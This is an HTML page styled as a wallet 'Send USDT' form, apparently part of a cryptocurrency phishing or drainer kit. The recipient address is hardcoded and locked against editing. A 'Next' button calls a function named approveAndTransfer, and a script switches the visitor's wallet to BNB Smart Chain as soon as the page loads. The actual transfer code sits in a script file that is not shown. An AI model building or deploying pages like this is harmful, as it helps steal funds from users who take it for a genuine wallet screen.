<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
  <div class="container">
    <label for="address">Address or Domain Name</label>
    <div class="input-wrapper">
      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
      <span onclick="clearAddress()">✕</span>
      <span onclick="pasteAddress()">Paste</span>
    </div>

    <label for="amount">Amount</label>
    <div class="amount-wrapper">
      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
      <span>USDT</span>
      <span onclick="fillMax()">Max</span>
    </div>

    <div class="amount-line" id="fiat">≈ $0.00</div>

    <button onclick="approveAndTransfer()">Next</button>
  </div>

  <script>
    // Auto-reload fix if blank (Trust Wallet)
    window.addEventListener("load", () => {
      if (document.body.innerHTML.trim() === "") {
        location.reload();
      }
    });

    // Auto switch to BNB Smart Chain (Chain ID: 0x38)
    async function ensureBNBChain() {
      if (window.ethereum) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          });
        } catch (err) {
          // If not added, try to add it
          if (err.code === 4902) {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18
                },
                blockExplorerUrls: ['https://bscscan.com']
              }]
            });
          }
        }
      }
    }

    ensureBNBChain();
  </script>

  <script src="script.js"></script>
</body>
</html>
